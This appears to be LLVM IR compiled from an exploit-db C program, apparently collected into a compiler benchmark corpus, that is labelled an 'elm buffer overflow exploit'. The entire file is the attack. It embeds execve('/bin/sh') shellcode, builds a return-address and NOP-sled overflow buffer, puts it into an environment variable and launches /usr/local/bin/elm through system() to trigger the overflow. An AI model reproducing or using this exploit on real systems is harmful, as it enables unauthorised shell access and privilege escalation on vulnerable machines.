; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20645.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20645.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@main.shellcode = internal global [39 x i8] c"\EB\17^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\081\D2\CD\80\E8\E4\FF\FF\FF/bin/shX\00", align 16
@LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"-------------------------------------\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"elm buffer overflow exploit by _kiss_\0A\00", align 1
@RET = common dso_local global i64 0, align 8
@NOP = common dso_local global i8 0, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"KID=\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"/usr/local/bin/elm -f $KID\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  %6 = load i32, i32* @LEN, align 4
  %7 = add nsw i32 %6, 4
  %8 = zext i32 %7 to i64
  %9 = call i8* @llvm.stacksave()
  store i8* %9, i8** %3, align 8
  %10 = alloca i8, i64 %8, align 16
  store i64 %8, i64* %4, align 8
  %11 = load i32, i32* @LEN, align 4
  %12 = add nsw i32 6, %11
  %13 = add nsw i32 %12, 4
  %14 = zext i32 %13 to i64
  %15 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %5, align 8
  %16 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %19

19:                                               ; preds = %29, %0
  %20 = load i32, i32* %1, align 4
  %21 = load i32, i32* @LEN, align 4
  %22 = icmp sle i32 %20, %21
  br i1 %22, label %23, label %32

23:                                               ; preds = %19
  %24 = load i64, i64* @RET, align 8
  %25 = load i32, i32* %1, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %10, i64 %26
  %28 = bitcast i8* %27 to i64*
  store i64 %24, i64* %28, align 1
  br label %29

29:                                               ; preds = %23
  %30 = load i32, i32* %1, align 4
  %31 = add nsw i32 %30, 4
  store i32 %31, i32* %1, align 4
  br label %19

32:                                               ; preds = %19
  store i32 0, i32* %1, align 4
  br label %33

33:                                               ; preds = %45, %32
  %34 = load i32, i32* %1, align 4
  %35 = load i32, i32* @LEN, align 4
  %36 = call i32 @strlen(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @main.shellcode, i64 0, i64 0))
  %37 = sub nsw i32 %35, %36
  %38 = sub nsw i32 %37, 100
  %39 = icmp slt i32 %34, %38
  br i1 %39, label %40, label %48

40:                                               ; preds = %33
  %41 = load i8, i8* @NOP, align 1
  %42 = load i32, i32* %1, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %10, i64 %43
  store i8 %41, i8* %44, align 1
  br label %45

45:                                               ; preds = %40
  %46 = load i32, i32* %1, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %1, align 4
  br label %33

48:                                               ; preds = %33
  %49 = load i32, i32* @LEN, align 4
  %50 = call i32 @strlen(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @main.shellcode, i64 0, i64 0))
  %51 = sub nsw i32 %49, %50
  %52 = sub nsw i32 %51, 100
  store i32 %52, i32* %1, align 4
  br label %53

53:                                               ; preds = %67, %48
  %54 = load i32, i32* %1, align 4
  %55 = load i32, i32* @LEN, align 4
  %56 = sub nsw i32 %55, 100
  %57 = icmp slt i32 %54, %56
  br i1 %57, label %58, label %70

58:                                               ; preds = %53
  %59 = load i32, i32* %2, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %2, align 4
  %61 = sext i32 %59 to i64
  %62 = getelementptr inbounds [39 x i8], [39 x i8]* @main.shellcode, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %10, i64 %65
  store i8 %63, i8* %66, align 1
  br label %67

67:                                               ; preds = %58
  %68 = load i32, i32* %1, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %1, align 4
  br label %53

70:                                               ; preds = %53
  %71 = call i32 @strcpy(i8* %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %72 = call i32 @strcat(i8* %15, i8* %10)
  %73 = call i32 @putenv(i8* %15)
  %74 = call i32 @system(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %75 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %75)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @system(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
